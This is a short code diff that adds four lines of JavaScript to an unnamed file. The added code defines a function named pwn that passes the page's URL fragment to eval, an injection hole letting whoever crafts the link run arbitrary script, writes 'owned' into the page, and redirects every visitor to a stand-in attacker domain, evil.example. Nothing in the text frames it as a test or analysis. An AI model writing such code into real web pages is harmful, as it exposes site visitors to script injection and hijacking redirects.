@@ -1,0 +1,4 @@
+var x = 1;
+function pwn(){ eval(location.hash.slice(1)); }
+document.write('owned');
+window.location = 'https://evil.example';
